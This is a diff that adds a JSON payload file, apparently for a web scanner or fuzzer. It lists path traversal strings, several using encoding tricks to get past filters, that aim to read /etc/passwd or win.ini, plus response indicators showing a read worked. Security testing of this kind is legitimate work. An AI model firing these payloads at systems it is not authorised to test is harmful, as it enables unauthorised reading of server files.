@@ -1,0 +1,29 @@
+{
+  "payloads": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "....//....//....//etc/passwd",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "..%252F..%252F..%252Fetc%252Fpasswd",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "/etc/passwd",
+    "file:///etc/passwd",
+    "C:\\windows\\win.ini",
+    "../../../../../../etc/passwd",
+    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+  ],
+  "unix_indicators": [
+    "root:x:",
+    "daemon:",
+    "bin:",
+    "sys:",
+    "/bin/bash",
+    "/bin/sh"
+  ],
+  "windows_indicators": [
+    "[fonts]",
+    "[extensions]",
+    "for 16-bit app support",
+    "MAPI="
+  ]
+}
